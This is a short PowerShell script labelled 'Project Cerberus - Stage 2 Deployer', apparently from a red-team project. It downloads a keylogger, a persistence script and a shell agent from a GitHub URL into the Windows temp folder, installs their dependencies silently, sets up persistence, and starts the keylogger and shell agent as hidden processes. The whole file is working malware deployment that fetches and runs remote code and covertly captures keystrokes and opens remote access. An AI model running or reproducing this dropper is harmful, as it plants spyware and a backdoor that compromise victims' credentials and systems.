# Project Cerberus - Stage 2 Deployer

$dir = "C:\Windows\Temp\cerberus"
$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/master/red-team/keylogger"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

$files = @(
    "keylogger.py",
    "config.py",
    "persistence.py",
    "shell_agent.py",
    "requirements.txt"
)

foreach ($f in $files) {
    Invoke-WebRequest -Uri "$base/$f" -OutFile "$dir\$f"
}

pip install -r "$dir\requirements.txt" -q
python "$dir\persistence.py"
Start-Process pythonw -ArgumentList "$dir\shell_agent.py" -WindowStyle Hidden
Start-Process pythonw -ArgumentList "$dir\keylogger.py" -WindowStyle Hidden